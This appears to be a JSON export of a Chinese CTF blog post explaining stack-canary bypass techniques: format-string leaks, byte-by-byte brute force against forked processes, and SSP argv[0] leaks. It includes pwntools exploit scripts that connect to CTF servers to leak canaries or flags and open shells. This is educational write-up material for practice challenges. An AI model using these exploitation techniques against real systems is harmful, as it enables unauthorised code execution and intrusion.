{"title":"绕过canary的六种方法","uid":"3c52b98d7c3f3c00c8108b428bc990ce","slug":"绕过canary的方法","date":"2021-10-25T12:49:23.000Z","updated":"2021-11-15T15:21:43.888Z","comments":true,"path":"api/articles/绕过canary的方法.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/DCnioH4MfqYX28I.jpg","content":"<h1 id=\"leak绕过\"><a href=\"#leak绕过\" class=\"headerlink\" title=\"leak绕过\"></a>leak绕过</h1><p>通过泄露canary来绕过canary，常见的有覆盖掉前面的\\x00让输出函数泄露，还有printf定点泄露</p>\n<h2 id=\"stackguard1\"><a href=\"#stackguard1\" class=\"headerlink\" title=\"stackguard1\"></a><strong>stackguard1</strong></h2><p>一个简单的64位canary保护程序，gdb调试可以看到一开始程序会从fs寄存器对应的偏移处取值放入rax中，rax会放入rbp-8的位置，最后清零eax<img src=\"https://i.loli.net/2021/10/22/iMEf48ZNa927yjJ.png\" alt=\"屏幕截图 2021-10-22 195020.png\"></p>\n<p>程序运行到快结束时，会检查canary，首先将canary取出到rcx，rcx会和fs寄存器对应的偏移处取出进行比较，不同就会跳转到__stack_chk_fail@plt位置<img src=\"https://i.loli.net/2021/10/22/9yZLESIY7cpKO8r.png\" alt=\"屏幕截图 2021-10-22 195405.png\"></p>\n<p>__stack_chk_fail函数会强行结束进程并弹出警告</p>\n<p>分析栈结构：缓冲区过后就是canary，所以如果是简单的溢出覆盖返回地址就会覆盖到canary，从而导致程序崩溃。因此，如果要利用栈溢出就一定要绕过canary。所以思路就是先通过输出函数泄露canary的值，之后在覆盖时用泄露的canary值覆盖canary，其它的就覆盖成我们想要的，这样就绕过了canary。</p>\n<p><img src=\"https://i.loli.net/2021/10/22/Rq56B1deJrujDh4.png\" alt=\"image.png\"></p>\n<p>通过字符串列表找到bin/sh，找到调用的位置，发现函数canary_protect_me函数里面会调用这个字符串，仔细分析一下，可以断定圈里面的汇编代码组装成函数execve(“bin/sh”,0,0) 等价于system(“bin/sh”)，所以我们可以利用栈溢出跳转到这里就可以获得shell</p>\n<p><img src=\"https://i.loli.net/2021/10/22/aFk6zUoXZ4H983J.png\" alt=\"屏幕截图 2021-10-22 201418.png\"></p>\n<p>因为是gets函数最后会补上\\x00，会终止printf读取，所以无法通过覆盖泄露，但因为是printf输出，所以可以采取格式化字符串漏洞泄露canary<img src=\"https://i.loli.net/2021/10/22/Sc4iJadPK5pWV32.png\" alt=\"屏幕截图 2021-10-22 203619.png\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">back_door = (<span class=\"number\">0x4011d6</span></span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x0401343</span></span><br><span class=\"line\">bin_sh = <span class=\"number\">0x402004</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./stackguard1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;123.57.230.48&#x27;</span>,<span class=\"number\">12344</span>)</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;%11$p&#x27;</span>  <span class=\"comment\"># 泄露出第十一个参数的值</span></span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">canary=<span class=\"built_in\">int</span>(p.recv(),<span class=\"number\">16</span>)  <span class=\"comment\"># 将接收的转为十六进制数</span></span><br><span class=\"line\"><span class=\"built_in\">print</span> canary</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(canary)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(back_door))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,&#x27;b main&#x27;)</span></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"one-by-one爆破\"><a href=\"#one-by-one爆破\" class=\"headerlink\" title=\"one by one爆破\"></a>one by one爆破</h1><p>虽然每次重启程序的canary会不同，但是在同一个进程中不同的线程中的canary是相同的，也就是说fork()函数创建的子进程中的canary是相同的。利用这一点我们可以逐字节爆破出来。</p>\n<h2 id=\"bin1\"><a href=\"#bin1\" class=\"headerlink\" title=\"bin1\"></a>bin1</h2><p>程序中存在fork函数，而且还是无限输出，符合one by one爆破条件，因为是32位程序，canary第一个字符是\\x00，所以我们只需要爆破3个字节，这三个字节对应的十六进制码范围为00~FF</p>\n<p><img src=\"https://i.loli.net/2021/10/26/lFXwj8JfDAdoEsZ.png\" alt=\"屏幕截图 2021-10-26 083224.png\"></p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">local = <span class=\"number\">1</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./bin1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> local:</span><br><span class=\"line\">    p = process(<span class=\"string\">&#x27;./bin1&#x27;</span>)</span><br><span class=\"line\">    libc = elf.libc</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&#x27;&#x27;</span>,)</span><br><span class=\"line\">    libc = ELF(<span class=\"string\">&#x27;./&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;welcome\\n&#x27;</span>)</span><br><span class=\"line\">canary = <span class=\"string\">&#x27;\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;the &quot;</span> + <span class=\"built_in\">str</span>(k) + <span class=\"string\">&quot;: &quot;</span> + <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">        p.send(<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">100</span> + canary + <span class=\"built_in\">chr</span>(i))</span><br><span class=\"line\">        a = p.recvuntil(<span class=\"string\">&quot;welcome\\n&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span> a</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;sucess&quot;</span> <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">                canary += <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">                <span class=\"built_in\">print</span> <span class=\"string\">&quot;canary: &quot;</span> + canary</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">addr = <span class=\"number\">0x0804863B</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">100</span> + canary + <span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">12</span> + p32(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ssp攻击\"><a href=\"#ssp攻击\" class=\"headerlink\" title=\"ssp攻击\"></a>ssp攻击</h1><p>ssp攻击原理是通过输入足够长的字符串覆盖掉argv[0]，就能让canary保护输出我们想要地址上的值。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__stack_chk_fail (<span class=\"keyword\">void</span>) &#123;</span><br><span class=\"line\">\t__fortify_fail (<span class=\"string\">&quot;stack smashing detected&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__fortify_fail (msg)</span><br><span class=\"line\">   <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *msg; &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* The loop is added only to keep gcc happy. */</span></span><br><span class=\"line\">         <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">              __libc_message (<span class=\"number\">2</span>, <span class=\"string\">&quot;*** %s ***: %s terminated\\n&quot;</span>, msg, __libc_argv[<span class=\"number\">0</span>] ?: <span class=\"string\">&quot;&lt;unknown&gt;&quot;</span>) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (__fortify_fail)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>上面是 stack_chk_fail()函数的源码，也就是触发canary后调用的函数，在libc_message函数中第二个%s输出的就是__libc_argv[0]，argv[0]是指向第一个启动参数字符串的指针。我们可以利用栈溢出将其覆盖成我们想要泄露的地址，当程序触发到canary时就可以泄露我们想要的东西了。</p>\n<h2 id=\"smashes\"><a href=\"#smashes\" class=\"headerlink\" title=\"smashes\"></a>smashes</h2><p>主函数只调用了这个函数，这个函数中存在gets危险函数，可以利用它进行栈溢出操作。<img src=\"https://i.loli.net/2021/11/15/UrIOTvQfePFLdlj.png\" alt=\"image.png\"></p>\n<p>在字符串窗口发现flag字样，根据提示我们可以知道flag就在这里，不过是在远端环境中<img src=\"https://i.loli.net/2021/11/15/vt1PArjFWlipJY9.png\" alt=\"image.png\"></p>\n<p>所以我们只要将argv[0]指向这个地址就可以泄露。</p>\n<p>但是后面发现行不通，并没有泄露我们想要泄露的地址里面的值。<img src=\"https://i.loli.net/2021/11/15/TZRsh7QgEb5V4Kd.png\" alt=\"image.png\"></p>\n<p>回到伪代码里面发现下面一行</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memset</span>((<span class=\"keyword\">void</span> *)((<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v0 + <span class=\"number\">0x600D20</span>LL), <span class=\"number\">0</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)(<span class=\"number\">32</span> - v0));</span><br></pre></td></tr></table></figure>\n\n<p>这行代码会将0x600D20这个地址里面的值清空，导致flag被清除。看了一下一些师傅的博客了解到ELF的重映射。<strong>当可执行文件足够小的时候，他的不同区段可能会被多次映射。也就是说该flag会在其他地方进行备份。</strong></p>\n<p><img src=\"https://i.loli.net/2021/11/15/QGDmy4HdWTqeKcz.png\" alt=\"image.png\"></p>\n<p>同时还要注意一点，64位下地址都是8的倍数所以最终我们要泄露的地址是0x400d20</p>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;pwn.jarvisoj.com&quot;</span>,<span class=\"number\">9877</span>)</span><br><span class=\"line\">p.recvuntil(&#x27;name? &#x27;)</span><br><span class=\"line\">p.sendline(p64(<span class=\"number\">0x400d20</span>)*<span class=\"number\">300</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"劫持-stack-chk-fail\"><a href=\"#劫持-stack-chk-fail\" class=\"headerlink\" title=\"劫持___stack_chk_fail\"></a>劫持___stack_chk_fail</h1><p>暂时还未找到相应题目，先放个链接<a href=\"https://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/#login\">https://blog.dazzlepppp.cn/2017/02/27/ZCTF-2017-write-up/#login</a></p>\n","feature":true,"text":"leak绕过通过泄露canary来绕过canary，常见的有覆盖掉前面的\\x00让输出函数泄露，还有printf定点泄露 stackguard1一个简单的64位canary保护程序，gdb调试可以看到一开始程序会从fs寄存器对应的偏移处取值放入rax中，rax会放入rbp-8的位...","link":"","photos":[],"count_time":{"symbolsCount":"3.5k","symbolsTime":"3 mins."},"categories":[{"name":"pwn","slug":"pwn","count":2,"path":"api/categories/pwn.json"}],"tags":[{"name":"笔记","slug":"笔记","count":2,"path":"api/tags/笔记.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#leak%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">leak绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#stackguard1\"><span class=\"toc-text\">stackguard1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#one-by-one%E7%88%86%E7%A0%B4\"><span class=\"toc-text\">one by one爆破</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#bin1\"><span class=\"toc-text\">bin1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ssp%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">ssp攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#smashes\"><span class=\"toc-text\">smashes</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8A%AB%E6%8C%81-stack-chk-fail\"><span class=\"toc-text\">劫持___stack_chk_fail</span></a></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"西湖论剑pwn复现","uid":"08ca8a643d07b9ceeb8a1eb3cf2f50b4","slug":"西湖论剑pwn复现","date":"2021-11-22T13:19:10.000Z","updated":"2021-11-22T14:11:44.271Z","comments":true,"path":"api/articles/西湖论剑pwn复现.json","keywords":null,"cover":[],"text":" 第一次参加西湖论剑，技术不够，一题没出，希望明年能够出个两三道 blind听darry👴说远端的libc被魔改了，对不上，加上没有远端环境，所以我就讲一下本地如何打通的。（全程darry👴讲解） 我一开始没注意到开了NX保护，所以想利用构造read函数让函数跳转执行shellc...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"PWN","slug":"PWN","count":2,"path":"api/categories/PWN.json"}],"tags":[{"name":"wp","slug":"wp","count":2,"path":"api/tags/wp.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"ctfshow-pwn","uid":"52662f34cef48ec0871eed4c3bef0137","slug":"ctfshow-pwn","date":"2021-10-17T09:55:50.000Z","updated":"2021-11-06T02:20:32.088Z","comments":true,"path":"api/articles/ctfshow-pwn.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/ctwdE4PqChNIpzb.jpg","text":"pwn03将附件拖进IDA中很容易发现存在栈溢出，但是没有后门函数以及system函数，也不能利用系统调用 所以函数地址泄露获得libc版本来获得system函数地址从而获得shell。具体步骤： 泄露 puts地址 获取 libc 版本 获取 system 地址与 /bin/s...","link":"","photos":[],"count_time":{"symbolsCount":"9.6k","symbolsTime":"9 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true}}